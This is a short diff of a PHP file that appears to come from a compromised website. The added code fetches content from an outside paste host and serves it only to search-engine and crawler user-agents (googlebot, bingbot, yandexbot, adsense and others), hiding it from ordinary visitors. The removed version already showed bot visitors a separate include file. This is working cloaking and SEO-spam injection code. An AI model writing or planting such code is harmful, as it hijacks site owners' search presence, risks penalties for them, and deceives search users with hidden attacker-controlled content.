@@ -1,14 +1,25 @@
 <?php
-// Kullanıcı IP'si ve User-Agent'ı kontrol et
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
+function mangsud($url) {
+    if (ini_get('allow_url_fopen')) {
+    return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
 
-// Google ile ilgili user-agent kontrolleri
-if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
-    include('file.php');  // Google bot ise google.php göster
-} elseif ($is_mobile) {
-    include('home.php');  // Mobil cihaz ise kullanici.php göster
-} else {
-    include('home.php');  // Diğer durumlar için default içerik
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://paste.phyo186.cfd/UqZzI-tuwLa/raw";
+$file = mangsud($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    echo $file;
+    exit;
 }
 ?>
